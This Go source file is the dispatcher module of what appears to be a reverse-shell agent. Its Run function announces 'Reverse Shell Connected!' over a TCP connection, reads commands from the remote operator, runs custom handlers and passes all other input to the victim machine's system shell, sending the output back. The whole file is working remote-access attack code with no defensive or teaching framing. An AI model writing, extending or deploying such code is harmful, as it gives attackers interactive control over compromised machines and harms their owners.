package Dispatcher

import (
	"fmt"
	"nombredetuapp/Documents/Proyecto/src/commands"
	"nombredetuapp/Documents/Proyecto/src/shell"
	"nombredetuapp/Documents/Proyecto/src/transport"
	"strings"
)

func HelpCommand(args []string) string {
	helpText := "Available commands:\n"
	for cmd := range commands.Commands {
		helpText += "- " + cmd + "\n"
	}
	return helpText
}

func Run(t transport.TCPTransport) {
	sh := shell.NewShell()

	header := fmt.Sprintf("\n[+] Reverse Shell Connected! \n[+] Type 'exit' to terminate the session.\n[+] Type 'help' to see the available commands.\n[*] This works like a shell if the command is not in the list of custom commands. will be executed in the system shell.\n\n")
	t.Send([]byte(header))

	for {
		prompt := fmt.Sprintf(
			"[agent] %s > ",
			sh.GetCWD(),
		)
		t.Send([]byte(prompt))

		input, err := t.Read()
		if err != nil {
			break
		}

		cmdLine := strings.TrimSpace(string(input))
		if cmdLine == "" {
			continue
		}

		if cmdLine == "exit" {
			t.Send([]byte("Session closed.\n"))
			return
		}
		if cmdLine == "help" {
			helpOutput := HelpCommand([]string{})
			t.Send([]byte(helpOutput))
			continue
		}

		parts := strings.Fields(cmdLine)
		cmd := parts[0]
		args := parts[1:]
		if handler, exists := commands.Commands[cmd]; exists {
			output := handler(args)
			t.Send([]byte(output))
			continue
		}

		output := sh.Execute(string(cmdLine))
		if output != "" {
			t.Send([]byte(output))
		}
	}
}
